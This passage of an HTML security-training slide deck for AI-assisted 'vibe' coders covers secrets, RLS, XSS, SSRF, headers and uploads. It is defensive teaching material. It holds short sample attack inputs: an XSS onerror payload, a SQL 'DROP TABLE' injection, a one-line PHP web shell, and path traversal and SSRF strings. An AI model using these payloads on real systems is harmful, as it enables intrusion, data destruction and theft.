    <p><strong>All secrets go in environment variables</strong> (.env files locally, platform env vars in production). Never hardcode secrets in your code.</p>
  </div>
  <div class="verify-section">
    <h3>Quick Check</h3>
    <ul class="checklist">
      <li>✅ .env file exists with all secrets</li>
      <li>✅ VITE_ prefix only on public keys</li>
      <li>✅ No hardcoded strings that look like keys</li>
    </ul>
  </div>
  <div id="secretsDemo" class="demo">
    <h4>🔑 Where Do These Secrets Belong?</h4>
    <p>Click each secret type to see where it should live:</p>
    <div class="secrets-grid">
      <div class="secret-card" onclick="showSecretInfo('supabase-public')" data-secret="supabase-public">
        <div class="secret-type">Supabase Anon</div>
        <div class="secret-preview">eyJh...VCJ9</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('supabase-service')" data-secret="supabase-service">
        <div class="secret-type">Supabase Service</div>
        <div class="secret-preview">eyJh...VCJ9</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('stripe-public')" data-secret="stripe-public">
        <div class="secret-type">Stripe Public</div>
        <div class="secret-preview">pk_test_51H...</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('stripe-secret')" data-secret="stripe-secret">
        <div class="secret-type">Stripe Secret</div>
        <div class="secret-preview">sk_test_51H...</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('google-maps')" data-secret="google-maps">
        <div class="secret-type">Google Maps</div>
        <div class="secret-preview">AIza...WK</div>
      </div>
      <div class="secret-card" onclick="showSecretInfo('jwt-secret')" data-secret="jwt-secret">
        <div class="secret-type">JWT Secret</div>
        <div class="secret-preview">your-256-bit...</div>
      </div>
    </div>
    <div class="secret-info"></div>
  </div>
</section>
<section class="slide" id="rls" data-color="teal" tabindex="-1">
  <h2>Data Access (Supabase RLS Made Simple)</h2>
  
  <div class="rls-layout">
    <div class="rls-content">
      <div class="mental-model">
        <h3>Mental Model</h3>
        <p><strong>"Who can see/change what"</strong> lives in DB policies. Turn <span class="highlight">RLS on</span> for all tables in Supabase.</p>
      </div>
      
      <div class="what-is-rls">
        <h3>What are RLS Policies?</h3>
        <p>Row Level Security (RLS) policies are SQL rules that automatically filter database rows based on the current user. They run <em>inside the database</em>, making them impossible to bypass from the frontend.</p>
      </div>
      
      <div class="assistant-brief">
        <h3>AI Prompt for RLS Setup</h3>
        <div class="prompt-box">
          <p>"Review my Supabase database and create RLS policies for all tables. For each table, create user-owns-row policies and show me the SQL. Test with users A/B to verify B cannot access A's data."</p>
        </div>
        <p class="tip">💡 <strong>Use the Supabase MCP</strong> - gives Claude Code & others direct access to review and manage your RLS policies, and more.</p>
      </div>
    </div>
    
    <div class="rls-demo">
      <div id="rlsDemo" class="demo">
        <h4>🔒 RLS Database Demo</h4>
        
        <div class="data-creation">
          <h5>Add Data to Database</h5>
          <div class="create-controls">
            <select id="dataOwner">
              <option value="User A">User A</option>
              <option value="User B">User B</option>
            </select>
            <input type="text" id="dataInput" placeholder="Enter some data..." />
            <button onclick="addDatabaseRecord()">Add Record</button>
          </div>
        </div>
        
        <div class="database-table">
          <h5>📊 Database Table: "notes"</h5>
          <table id="databaseTable">
            <thead>
              <tr>
                <th>ID</th>
                <th>Owner</th>
                <th>Data</th>
                <th>Created</th>
              </tr>
            </thead>
            <tbody id="tableBody">
              <!-- Database records will appear here -->
            </tbody>
          </table>
        </div>
        
        <div class="query-controls">
          <h5>🔍 Run Query</h5>
          <div class="query-settings">
            <div class="current-user">
              <label>Current User:</label>
              <select id="currentUser">
                <option value="User A">User A</option>
                <option value="User B">User B</option>
              </select>
            </div>
            <div class="rls-toggle">
              <label>
                <input type="checkbox" id="rlsEnabled" checked>
                RLS Protection ON
              </label>
            </div>
            <button onclick="runQuery()" class="query-btn">SELECT * FROM notes</button>
          </div>
        </div>
        
        <div class="query-results">
          <h5 id="resultsTitle">Query Results</h5>
          <div id="sqlDisplay" class="sql-display"></div>
          <table id="resultsTable">
            <thead>
              <tr>
                <th>ID</th>
                <th>Owner</th>
                <th>Data</th>
                <th>Created</th>
              </tr>
            </thead>
            <tbody id="resultsBody">
              <!-- Query results will appear here -->
            </tbody>
          </table>
          <div id="securityWarning" class="security-warning" style="display: none;"></div>
        </div>
        
        <div class="demo-controls">
          <button onclick="resetDatabase()" class="reset-btn">Reset Database</button>
        </div>
      </div>
    </div>
  </div>
</section>
<section class="slide" id="xss-demo" data-color="violet" tabindex="-1">
  <h2>Input Validation & XSS</h2>
  <p>Keep it simple: expect exact types/lengths/formats. Never trust user input.</p>
  <div id="xssMount" class="demo">
    <h4>XSS Protection Demo</h4>
    <div class="demo-inputs">
      <label for="xssInput"><strong>Try some HTML/JS</strong></label>
      <textarea id="xssInput" rows="4" placeholder="Try: &lt;img src=x onerror=alert('XSS!')&gt;"></textarea>
      <div class="demo-buttons">
        <button id="btnInsecure" class="danger-btn">Render (insecure)</button>
        <button id="btnSecure" class="safe-btn">Render (escaped)</button>
        <button id="btnClear">Clear</button>
      </div>
    </div>
    <div class="demo-output">
      <strong>Output</strong>
      <div id="xssOut"></div>
    </div>
  </div>
  <details class="notes">
    <summary>Speaker notes</summary>
    <ul>
      <li>Show an <code>&lt;img onerror&gt;</code> payload executing in the insecure path</li>
      <li>Toggle to the secure path to see proper escaping</li>
      <li>Demo the "Cookie Theft" payload - explain how this steals session cookies</li>
      <li><strong>Important:</strong> CORS doesn't prevent XSS cookie theft because the malicious script runs on your own domain (same-origin)</li>
      <li><strong>What prevents cookie theft:</strong> CSP (blocks script execution), HttpOnly cookies (prevents document.cookie access), input sanitization</li>
      <li>Highlight CSP and DOMPurify as production options</li>
    </ul>
  </details>
</section>
<section class="slide" id="api-limits" data-color="blue" tabindex="-1">
  <h2>API Surface & Rate Limiting</h2>
  <div class="key-concepts">
    <h3>Global limits + quotas for everything</h3>
    <ul>
      <li>Per-IP limits (prevent DDoS)</li>
      <li>Per-user limits (prevent abuse)</li>
      <li>Per-key limits (API quotas)</li>
      <li>Costly operations get lower limits</li>
    </ul>
  </div>
  <div id="rateLimitDemo" class="demo">
    <h4>Rate Limit Demo</h4>
    <div class="limit-controls">
      <button onclick="makeRequest()">Make API Request</button>
      <button onclick="floodRequests()">Flood Requests (10x)</button>
      <button onclick="resetLimits()">Reset Limits</button>
    </div>
    <div class="request-log"></div>
  </div>
</section>
<section class="slide" id="cors-headers" data-color="orange" tabindex="-1">
  <h2>CORS & Headers</h2>
  
  <div class="quick-rules">
    <span class="avoid-rule">❌ <strong>Avoid:</strong> <code>Access-Control-Allow-Origin: *</code> + credentials</span>
    <span class="need-rule">✅ <strong>Need:</strong> The 4 essential headers below</span>
  </div>
  
  <div class="essential-headers">
    <h3>The 4 Essential Headers</h3>
    <div class="headers-row">
      <div class="header-item" onclick="toggleHeaderDetail(this)">
        <div class="header-name">CSP</div>
        <div class="header-purpose">Blocks XSS attacks</div>
        <div class="header-detail" style="display: none;">
          Content Security Policy controls which scripts, styles, and resources can load.
        </div>
      </div>
      <div class="header-item" onclick="toggleHeaderDetail(this)">
        <div class="header-name">HSTS</div>
        <div class="header-purpose">Forces HTTPS</div>
        <div class="header-detail" style="display: none;">
          Prevents browsers from downgrading to insecure HTTP.
        </div>
      </div>
      <div class="header-item" onclick="toggleHeaderDetail(this)">
        <div class="header-name">X-Frame-Options</div>
        <div class="header-purpose">Stops clickjacking</div>
        <div class="header-detail" style="display: none;">
          Prevents malicious sites from embedding your page in an iframe.
        </div>
      </div>
      <div class="header-item" onclick="toggleHeaderDetail(this)">
        <div class="header-name">CORS</div>
        <div class="header-purpose">Controls API access</div>
        <div class="header-detail" style="display: none;">
          Cross-Origin Resource Sharing decides which domains can call your API.
        </div>
      </div>
    </div>
  </div>
  
  <div class="headers-check">
    🔍 <strong>Check Your Headers:</strong> 
    <button onclick="openHeadersModal()" class="inline-btn">Analyze Now</button>
  </div>
  
  <div class="assistant-brief">
    <h3>✅ Ask AI to analyze</h3>
    <div class="prompt-box">
      <p>"Check what security headers my app currently has and explain if they're protecting me properly. Tell me in simple terms what each header does and what attacks they prevent. If any are missing or misconfigured, explain the risks."</p>
    </div>
  </div>
  
  <p class="origin-footnote">💡 <em>Origin = protocol + domain + port (e.g., https://app.example.com:443)</em></p>
</section>
<section class="slide" id="storage" data-color="indigo" tabindex="-1">
  <h2>Storage & File Uploads</h2>
  <div class="storage-rules">
    <h3>Rules</h3>
    <div class="compact-rules">
      <div class="rule-compact">
        <strong>Private buckets by default</strong> - Lock down storage with explicit access controls
      </div>
      <div class="rule-compact">
        <strong>Signed URLs for access</strong> - Time-limited, cryptographic URLs for secure access
      </div>
      <div class="rule-compact">
        <strong>MIME/size caps enforced</strong> - Validate by content, not extension. Check magic bytes
      </div>
      <div class="rule-compact">
        <strong>Virus scanning (optional)</strong> - When users download each other's files
      </div>
      <div class="rule-compact">
        <strong>Never serve from app server</strong> - Use CDN/object storage to prevent DoS
      </div>
    </div>
  </div>
  <div id="uploadDemo" class="demo">
    <h4>Upload Validation Demo</h4>
    <input type="file" id="fileInput" />
    <div class="upload-status"></div>
    <div class="validation-results"></div>
  </div>
</section>
<section class="slide" id="server-calls" data-color="teal" tabindex="-1">
  <h2>Server‑Side API Calls</h2>
  <div class="key-rules">
    <h3>SSRF: Server fetching attacker URLs</h3>
    <ul>
      <li>Use an outbound allowlist (exact hosts)</li>
      <li>Block private/loopback/metadata IPs (IPv4/IPv6)</li>
      <li>Only allow http/https on standard ports</li>
      <li>Disallow redirects/userinfo tricks; resolve DNS before fetch</li>
    </ul>
  </div>
  <div id="ssrfDemo" class="demo">
    <h4>SSRF Protection Demo</h4>
    <input type="url" placeholder="Enter URL to fetch..." />
    <button onclick="testSSRF(this)">Test Fetch</button>
    <div class="ssrf-results"></div>
  </div>
</section>
<section class="slide" id="vuln-classes" data-color="red" tabindex="-1">
  <h2>Lightning Round: Vulnerability Classes</h2>
  
  <div class="vuln-stack-container">
    <div class="vuln-nav">
      <button class="vuln-nav-btn" id="prevBtn" onclick="prevVuln()">← Previous</button>
      <div class="vuln-counter" id="vulnCounter">1 / 10</div>
      <button class="vuln-nav-btn" id="nextBtn" onclick="nextVuln()">Next →</button>
    </div>
    
    <div class="vuln-carousel">
      <div class="vuln-carousel-track" id="vulnCarousel">
        <div class="vuln-stack-card active" data-index="0">
          <h4>Injection</h4>
          <p><strong>Model:</strong> untrusted input becomes code</p>
          <p><strong>Example:</strong> <code>SELECT * FROM users WHERE id = ${userId}</code><br>
          → User sends: <code>1; DROP TABLE users--</code></p>
          <p><strong>Do:</strong> parameterized queries, no string concat</p>
        </div>
        <div class="vuln-stack-card" data-index="1">
          <h4>XSS</h4>
          <p><strong>Model:</strong> untrusted data renders as HTML/JS</p>
          <p><strong>Example:</strong> <code>Welcome ${userName}!</code><br>
          → User sends: <code>&lt;script&gt;alert('hacked')&lt;/script&gt;</code></p>
          <p><strong>Do:</strong> auto-escape templates, CSP</p>
        </div>
        <div class="vuln-stack-card" data-index="2">
          <h4>SSRF</h4>
          <p><strong>Model:</strong> server fetches attacker URLs</p>
          <p><strong>Example:</strong> <code>fetch(userUrl)</code><br>
          → User sends: <code>http://localhost:3306/admin</code></p>
          <p><strong>Do:</strong> outbound allowlist, block private IPs</p>
        </div>
        <div class="vuln-stack-card" data-index="3">
          <h4>IDOR/BOLA</h4>
          <p><strong>Model:</strong> users access objects they don't own</p>
          <p><strong>Example:</strong> <code>/api/user/123/profile</code><br>
          → User changes to: <code>/api/user/124/profile</code></p>
          <p><strong>Do:</strong> enforce ownership in DB (RLS)</p>
        </div>
        <div class="vuln-stack-card" data-index="4">
          <h4>Mass Assignment</h4>
          <p><strong>Model:</strong> user sets unintended fields</p>
          <p><strong>Example:</strong> <code>User.update(req.body)</code><br>
          → User sends: <code>{name: "John", isAdmin: true}</code></p>
          <p><strong>Do:</strong> whitelist updateable fields</p>
        </div>
        <div class="vuln-stack-card" data-index="5">
          <h4>File Uploads</h4>
          <p><strong>Model:</strong> files as malware/bombs</p>
          <p><strong>Example:</strong> User uploads <code>image.jpg</code><br>
          → Actually contains: <code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
          <p><strong>Do:</strong> MIME limits, object storage, scan</p>
        </div>
        <div class="vuln-stack-card" data-index="6">
          <h4>CSRF</h4>
          <p><strong>Model:</strong> malicious site submits forms on user's behalf</p>
          <p><strong>Example:</strong> Evil site has: <code>&lt;form action="bank.com/transfer"&gt;</code><br>
          → Submits when user visits (using their cookies)</p>
          <p><strong>Do:</strong> CSRF tokens, SameSite cookies</p>
        </div>
        <div class="vuln-stack-card" data-index="7">
          <h4>Path Traversal</h4>
          <p><strong>Model:</strong> user accesses files outside intended directory</p>
          <p><strong>Example:</strong> <code>GET /download?file=report.pdf</code><br>
          → User sends: <code>../../../etc/passwd</code></p>
          <p><strong>Do:</strong> validate paths, use allowlists, sandbox</p>
        </div>
        <div class="vuln-stack-card" data-index="8">
          <h4>Business Logic</h4>
          <p><strong>Model:</strong> workflow assumptions attackers can break</p>
          <p><strong>Example:</strong> Discount code for "first purchase only"<br>
          → User deletes/recreates account repeatedly</p>
          <p><strong>Do:</strong> validate business rules server-side</p>
        </div>
        <div class="vuln-stack-card" data-index="9">
          <h4>Race Conditions</h4>
          <p><strong>Model:</strong> concurrent requests bypass checks</p>
          <p><strong>Example:</strong> Check balance → withdraw money<br>
          → User sends 100 withdrawals simultaneously</p>
          <p><strong>Do:</strong> database transactions, atomic operations</p>
        </div>
      </div>
    </div>
  </div>
</section>
<section class="slide" id="keep-current" data-color="green" tabindex="-1">
  <h2>Keep It Current</h2>
  <p class="slide-intro"><strong>Security is ongoing maintenance</strong> — dependencies get stale, vulnerabilities emerge daily. Automate the tedious parts.</p>
  <p class="slide-intro"><strong>⚠️ LLMs are stuck in time</strong> — they'll start projects with outdated packages. When starting any project, immediately audit and upgrade to current versions.</p>
  <div class="assistant-brief">
    <h3>AI Coder Prompt</h3>
    <div class="prompt-box">
      <p>"Generate a complete Software Bill of Materials (SBOM) for this project. List all dependencies, their versions, licenses, and known vulnerabilities. Include: 1) direct and transitive dependencies, 2) runtime/framework versions, 3) build tools and dev dependencies, 4) system dependencies if applicable. Export as JSON and human-readable format."</p>
    </div>
    
    <h3>Deep Research Agent Prompt</h3>
    <div class="prompt-box">
      <p>"Analyze this SBOM and research the latest versions of all dependencies. For each outdated package: 1) identify security vulnerabilities in current version, 2) check if latest version fixes critical/high CVEs, 3) flag potential breaking changes in upgrade path, 4) prioritize updates by security impact. Generate an upgrade roadmap with risk assessment."</p>
    </div>
  </div>
  <div class="verify-section">
    <h3>Verify Updates</h3>
    <ul class="checklist">
      <li>✅ Critical vulnerabilities patched</li>
      <li>✅ Breaking changes documented & tested</li>
      <li>✅ SBOM regenerated with new versions</li>
      <li>✅ Automated update pipeline configured</li>
    </ul>
  </div>
</section>
<section class="slide" id="threat-modeling" data-color="violet" tabindex="-1">
  <h2>Threat Modeling Primer</h2>
  
  <div class="threat-modeling-sections">
    <div class="four-questions">
      <h3>Four Key Questions</h3>
      <div class="questions-grid">
        <div class="question">
          <h4>1. What are we working on?</h4>
          <p>Understand your system, components, and data flows</p>
        </div>
        <div class="question">
          <h4>2. What can go wrong?</h4>
          <p>Identify threats and attack scenarios</p>
        </div>
        <div class="question">
          <h4>3. What are we going to do about it?</h4>
          <p>Prioritize risks and pick concrete mitigations</p>
        </div>
        <div class="question">
          <h4>4. Did we do a good enough job?</h4>
          <p>Review, validate, and test your defenses</p>
        </div>
      </div>
    </div>

    <div class="stride-model">
      <h3>STRIDE Reference Model</h3>
      <div class="stride-grid">
        <div class="stride-item">
          <strong>S</strong>poofing - Identity impersonation
          <div class="stride-desc">Pretending to be someone or something else</div>
        </div>
        <div class="stride-item">
          <strong>T</strong>ampering - Data modification
          <div class="stride-desc">Maliciously changing data or code</div>
        </div>
        <div class="stride-item">
          <strong>R</strong>epudiation - Action denial
          <div class="stride-desc">Denying that an action was performed</div>
        </div>
        <div class="stride-item">
          <strong>I</strong>nformation Disclosure - Data leaks
          <div class="stride-desc">Exposing information to unauthorized parties</div>
        </div>
        <div class="stride-item">
          <strong>D</strong>enial of Service - Availability attacks
          <div class="stride-desc">Making systems unavailable to legitimate users</div>
        </div>
        <div class="stride-item">
          <strong>E</strong>levation of Privilege - Unauthorized access
          <div class="stride-desc">Gaining higher permissions than intended</div>
        </div>
      </div>
    </div>
  </div>
</section>
<section class="slide" id="checklist" data-color="blue" tabindex="-1">
  <h2>Infrastructure Security for Vibe Coders</h2>
  
  <div class="infra-tips">
    <div class="tip-section">
      <h3>🎯 Platform Choice Matters</h3>
      <p><strong>Vercel/Netlify:</strong> Auto HTTPS, CDN, but check function timeouts for auth flows</p>
      <p><strong>Railway/Render:</strong> Great for full-stack, but configure health checks and restart policies</p>
      <p><strong>VPS (Digital Ocean/Linode):</strong> You own security—firewall, SSH keys, fail2ban, auto-updates</p>
    </div>

    <div class="tip-section">
      <h3>🔐 The Deployment Gotchas</h3>
      <p><strong>Environment Variables:</strong> Never commit .env files; use platform secret managers</p>
      <p><strong>Default Passwords:</strong> Change database defaults immediately (postgres/admin123)</p>
      <p><strong>Open Ports:</strong> VPS exposes everything—close 22, 3389, database ports to public</p>
      <p><strong>SSL Certificates:</strong> Let's Encrypt auto-renewal; don't let certs expire</p>
    </div>

    <div class="tip-section">
      <h3>⚠️ What Can Go Wrong</h3>
      <p><strong>Exposed Admin Panels:</strong> /admin, /phpmyadmin, /wp-admin left accessible</p>
      <p><strong>Debug Mode On:</strong> Stack traces leak internal paths and database structure</p>
      <p><strong>Backup Exposure:</strong> .sql, .tar.gz files served by web server</p>
      <p><strong>Directory Listing:</strong> Nginx/Apache serving file listings instead of 404s</p>
    </div>
  </div>
</section>
<section class="slide" id="resources" data-color="indigo" tabindex="-1">
  <h2>Resources & Next Steps</h2>
  <div class="resources-grid">
    <div class="resource-section">
      <h3>Learn More</h3>
      <ul>
        <li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer">OWASP Top 10</a></li>
        <li><a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank" rel="noopener noreferrer">MDN Web Security</a></li>
        <li><a href="https://supabase.com/docs/guides/auth/row-level-security" target="_blank" rel="noopener noreferrer">Supabase RLS Docs</a></li>
        <li><a href="https://docs.replit.com/tutorials/vibe-code-security-checklist" target="_blank" rel="noopener noreferrer">Replit Security Checklist</a></li>
        <li><a href="https://vercel.com/blog/v0-vibe-coding-securely" target="_blank" rel="noopener noreferrer">Vercel: Vibe Coding Securely</a></li>
      </ul>
    </div>
    <div class="resource-section">
      <h3>Copy‑Paste Prompts</h3>
      <div class="prompt-examples">
        <div class="prompt-example">
          <strong>Security Review:</strong>
          <code>"Audit this repository for: secrets, auth, RLS, rate limiting, CORS, CSP, file uploads. Return exact file changes."</code>
        </div>
        <div class="prompt-example">
          <strong>Endpoint Guards:</strong>
          <code>"Add schema validation, rate limiting, ownership checks, and helpful 4xx errors to this route."</code>
        </div>
      </div>
    </div>
  </div>
  
  <div class="tagline-footer">
    <h3>🤖 You're just one prompt away from security</h3>
  </div>
</section>

    </main>

    <!-- Slide indicator -->
    <div id="slideIndicator" class="slide-indicator">
      <span id="currentSlide">1</span>/<span id="totalSlides">16</span>
    </div>

    <!-- Table of Contents -->
    <div id="tableOfContents" class="table-of-contents">
      <div class="toc-header">Table of Contents</div>
      <div class="toc-content">
        <div class="toc-item" data-slide="intro">
          <span class="toc-number">1</span>
          <span class="toc-title">How To Vibe Secure</span>
        </div>
        <div class="toc-item" data-slide="mindset">
          <span class="toc-number">2</span>
          <span class="toc-title">Mindset: Default‑Deny</span>
        </div>
        <div class="toc-item" data-slide="frontend-backend">
          <span class="toc-number">3</span>
          <span class="toc-title">Frontend vs Backend</span>
        </div>
        <div class="toc-item" data-slide="ai-prompts">
          <span class="toc-number">4</span>
          <span class="toc-title">How to Talk to Your AI</span>
        </div>
        <div class="toc-item" data-slide="secrets">
          <span class="toc-number">5</span>
          <span class="toc-title">Secrets Management</span>
        </div>
        <div class="toc-item" data-slide="rls">
          <span class="toc-number">6</span>
          <span class="toc-title">Data Access (RLS)</span>
        </div>
        <div class="toc-item" data-slide="xss-demo">
          <span class="toc-number">7</span>
          <span class="toc-title">Input Validation & XSS</span>
        </div>
        <div class="toc-item" data-slide="api-limits">
          <span class="toc-number">8</span>
          <span class="toc-title">API Surface & Rate Limiting</span>
        </div>
        <div class="toc-item" data-slide="cors-headers">
          <span class="toc-number">9</span>
          <span class="toc-title">CORS & Headers</span>
        </div>
        <div class="toc-item" data-slide="storage">
          <span class="toc-number">10</span>
          <span class="toc-title">Storage & File Uploads</span>
        </div>
        <div class="toc-item" data-slide="server-calls">
          <span class="toc-number">11</span>
          <span class="toc-title">Server‑Side API Calls</span>
        </div>
        <div class="toc-item" data-slide="vuln-classes">
          <span class="toc-number">12</span>
          <span class="toc-title">Vulnerability Classes</span>
        </div>
        <div class="toc-item" data-slide="keep-current">
          <span class="toc-number">13</span>
          <span class="toc-title">Keep It Current</span>
        </div>
        <div class="toc-item" data-slide="threat-modeling">
          <span class="toc-number">14</span>
          <span class="toc-title">Threat Modeling Primer</span>
        </div>
        <div class="toc-item" data-slide="checklist">
          <span class="toc-number">15</span>
          <span class="toc-title">10‑Minute Hardening Checklist</span>
        </div>
        <div class="toc-item" data-slide="resources">
          <span class="toc-number">16</span>
          <span class="toc-title">Resources & Next Steps</span>
        </div>
      </div>
    </div>

    <!-- Headers Analysis Modal -->
    <div id="headersModal" class="modal" style="display: none;">
      <div class="modal-overlay" onclick="closeHeadersModal()"></div>
      <div class="modal-content">
        <div class="modal-header">
          <h3>🔍 Security Headers Analysis</h3>
          <button class="modal-close" onclick="closeHeadersModal()" aria-label="Close">×</button>
        </div>
        <div class="modal-body">
          <div id="headersAnalysis">
            <!-- Analysis results will be populated here -->
          </div>
        </div>
      </div>
    </div>

    <script>
// Minimal client script: progress and navigation (light mode only)

const $ = (sel, ctx = document) => ctx.querySelector(sel);
const $$ = (sel, ctx = document) => Array.from(ctx.querySelectorAll(sel));
const getScroller = () => document.getElementById('content');

// Slide configuration
const SLIDES = [
  { id: 'intro', file: '01-intro.html', title: 'How To Vibe Secure' },
  { id: 'mindset', file: '02-mindset.html', title: 'Mindset: Default‑Deny' },
  { id: 'frontend-backend', file: '03-frontend-backend.html', title: 'Frontend vs Backend' },
  { id: 'ai-prompts', file: '04-ai-prompts.html', title: 'How to Talk to Your AI' },
  { id: 'secrets', file: '05-secrets.html', title: 'Secrets Management' },
  { id: 'rls', file: '06-rls.html', title: 'Data Access (RLS)' },
  { id: 'xss-demo', file: '07-xss-demo.html', title: 'Input Validation & XSS' },
  { id: 'api-limits', file: '08-api-limits.html', title: 'API Surface & Rate Limiting' },
  { id: 'cors-headers', file: '09-cors-headers.html', title: 'CORS & Headers' },
  { id: 'storage', file: '10-storage.html', title: 'Storage & File Uploads' },
  { id: 'server-calls', file: '11-server-calls.html', title: 'Server‑Side API Calls' },
  { id: 'vuln-classes', file: '12-vuln-classes.html', title: 'Vulnerability Classes' },
  { id: 'keep-current', file: '13-keep-current.html', title: 'Keep It Current' },
  { id: 'threat-modeling', file: '14-threat-modeling.html', title: 'Threat Modeling Primer' },
  { id: 'checklist', file: '15-checklist.html', title: '10‑Minute Hardening Checklist' },
  { id: 'resources', file: '16-resources.html', title: 'Resources & Next Steps' }
];

function getSections() {
  return $$('.slide');
}

function nextSection(dir = 1) {
  const scroller = getScroller();
  const sections = getSections();
  const pos = (scroller?.scrollTop || 0) + 1; // nudge to avoid edge rounding
  let currentIndex = sections.findIndex(s => {
    const top = s.offsetTop;
    const bottom = top + s.offsetHeight;
    return pos >= top && pos < bottom;
  });
  if (currentIndex === -1) currentIndex = 0;
  const target = sections[Math.min(Math.max(currentIndex + dir, 0), sections.length - 1)];
  if (scroller && target) {
    scroller.scrollTo({ top: target.offsetTop, behavior: 'smooth' });
    target.focus({ preventScroll: true });
  }
}

function initProgress() {
  const scroller = getScroller();
  const sections = getSections();
  const currentSlideSpan = $('#currentSlide');
  const totalSlidesSpan = $('#totalSlides');
  
  // Update total slides count
  if (totalSlidesSpan) totalSlidesSpan.textContent = SLIDES.length;
  
  const onScroll = () => {
    const allSections = getSections();
    // Robust detection: choose the section intersecting the viewport center
    const viewportCenterY = Math.floor(window.innerHeight / 2);
    let idx = 0;
    for (let i = 0; i < allSections.length; i++) {
      const rect = allSections[i].getBoundingClientRect();
      const top = Math.floor(rect.top);
      const bottom = Math.floor(rect.bottom);
      if (top <= viewportCenterY && bottom > viewportCenterY) {
        idx = i;
        break;
      }
      // Fallback: if center isn't inside any, approximate by top crossing
      if (top <= 1) idx = i;
    }
    if (currentSlideSpan) currentSlideSpan.textContent = idx + 1;
    updateTOCActive(idx);
  };
  
  scroller?.addEventListener('scroll', onScroll, { passive: true });
  // Also listen on window to catch browser/viewport scrolling cases
  window.addEventListener('scroll', onScroll, { passive: true });
  onScroll();
  
  // Check content overflow on load and resize
  checkContentOverflow();
  window.addEventListener('resize', checkContentOverflow, { passive: true });

  // Robust slide detection: also use IntersectionObserver when available
  if (typeof IntersectionObserver !== 'undefined' && scroller) {
    const observedSections = getSections();
    let lastIdx = -1;
    const io = new IntersectionObserver((entries) => {
      // Pick the most visible slide
      const visible = entries
        .filter(e => e.isIntersecting)
        .sort((a, b) => b.intersectionRatio - a.intersectionRatio)[0];
      if (!visible) return;
      const idx = observedSections.indexOf(visible.target);
      if (idx !== -1 && idx !== lastIdx) {
        lastIdx = idx;
        if (currentSlideSpan) currentSlideSpan.textContent = idx + 1;
        updateTOCActive(idx);
      }
    }, { root: scroller, threshold: [0.25, 0.5, 0.75] });
    observedSections.forEach(s => io.observe(s));
  }

  // Fallback: RAF watcher in case scroll events are missed by the scroller
  if (scroller && typeof requestAnimationFrame !== 'undefined') {
    let lastTop = -1;
    const tick = () => {
      const top = scroller.scrollTop || 0;
      if (top !== lastTop) {
        onScroll();
        lastTop = top;
      }
      requestAnimationFrame(tick);
    };
    requestAnimationFrame(tick);
  }
}

function checkContentOverflow() {
  const slides = getSections();
  slides.forEach(slide => {
    // Reset classes
    slide.classList.remove('overflow-content', 'scale-content');
    // Remove any previous inline scale override
    slide.style.removeProperty('--slide-scale');

    // Check if content is taller than viewport
    const slideHeight = slide.offsetHeight;
    const viewportHeight = window.innerHeight;
    const contentHeight = slide.scrollHeight;
    
    if (contentHeight > viewportHeight * 0.95) {
      // If content is very tall, try scaling first
      if (contentHeight > viewportHeight * 1.2) {
        slide.classList.add('scale-content');
        // Re-check after scaling
        setTimeout(() => {
          if (slide.scrollHeight > viewportHeight * 0.98) {
            slide.classList.add('overflow-content');
          }
        }, 100);
      } else {
        slide.classList.add('overflow-content');
      }
    }
  });
}

function initKeyboardNav() {
  window.addEventListener('keydown', (e) => {
    if (['INPUT', 'TEXTAREA'].includes((e.target && e.target.tagName) || '')) return;
    if (e.key === 'j' || e.key === 'ArrowDown' || e.key === 'PageDown' || e.key === ' ') {
      e.preventDefault();
      nextSection(1);
    }
    if (e.key === 'k' || e.key === 'ArrowUp' || e.key === 'PageUp') {
      e.preventDefault();
      nextSection(-1);
    }
    if (e.key === 'Home') {
      e.preventDefault();
      getSections()[0]?.scrollIntoView({ behavior: 'smooth' });
    }
    if (e.key === 'End') {
      e.preventDefault();
      const s = getSections();
      s[s.length - 1]?.scrollIntoView({ behavior: 'smooth' });
    }
  });
}

function initSnapWheel() {
  const scroller = getScroller();
  if (!scroller) return;
  let animating = false;
  let accum = 0;
  let targetTop = null;
  const reset = () => { animating = false; targetTop = null; accum = 0; };
  const onWheel = (e) => {
    // Ignore if user is using horizontal scroll or holding modifiers
    if (Math.abs(e.deltaY) < Math.abs(e.deltaX)) return;
    accum += e.deltaY;
    if (animating) { e.preventDefault(); return; }
    const threshold = 40; // minimal intent to move a slide
    if (Math.abs(accum) > threshold) {
      e.preventDefault();
      const dir = accum > 0 ? 1 : -1;
      accum = 0;
      const sections = getSections();
      // Find current index by nearest offsetTop <= scrollTop
      let idx = 0;
      for (let i = 0; i < sections.length; i++) {
        if ((scroller.scrollTop + 1) >= sections[i].offsetTop) idx = i; else break;
      }
      const nextIdx = Math.min(Math.max(idx + dir, 0), sections.length - 1);
      const target = sections[nextIdx];
      if (!target) return;
      animating = true;
      targetTop = target.offsetTop;
      scroller.scrollTo({ top: targetTop, behavior: 'smooth' });
      // Fallback timer in case 'scroll' doesn't settle
      setTimeout(reset, 600);
    }
  };
  const onScroll = () => {
    if (targetTop == null) return;
    const diff = Math.abs(scroller.scrollTop - targetTop);
    if (diff < 2) reset();
  };
  scroller.addEventListener('wheel', onWheel, { passive: false });
  scroller.addEventListener('scroll', onScroll, { passive: true });
}

function initTOC() {
  const tocItems = $$('.toc-item');
  const scroller = getScroller();
  const toc = $('#tableOfContents');
  const slideIndicator = $('#slideIndicator');
  
  // Handle TOC item clicks
  tocItems.forEach(item => {
    item.addEventListener('click', () => {
      const slideId = item.dataset.slide;
      const targetSlide = $(`#${slideId}`);
      if (targetSlide && scroller) {
        scroller.scrollTo({ top: targetSlide.offsetTop, behavior: 'smooth' });
      }
    });
  });
  
  if (toc && slideIndicator) {
    let hideTimeout;
    
    function showTOC() {
      clearTimeout(hideTimeout);
      toc.classList.add('show');
    }
    
    function hideTOC() {
      clearTimeout(hideTimeout);
      hideTimeout = setTimeout(() => {
        toc.classList.remove('show');
      }, 200);
    }
    
    // Show TOC when hovering slide indicator
    slideIndicator.addEventListener('mouseenter', showTOC);
    slideIndicator.addEventListener('mouseleave', hideTOC);
    // Also show TOC on click/tap for touch devices
    slideIndicator.addEventListener('click', () => {
      if (!toc.classList.contains('show')) {
        showTOC();
      } else {
        toc.classList.remove('show');
      }
    });
    
    // Keep TOC open when hovering over it
    toc.addEventListener('mouseenter', () => {
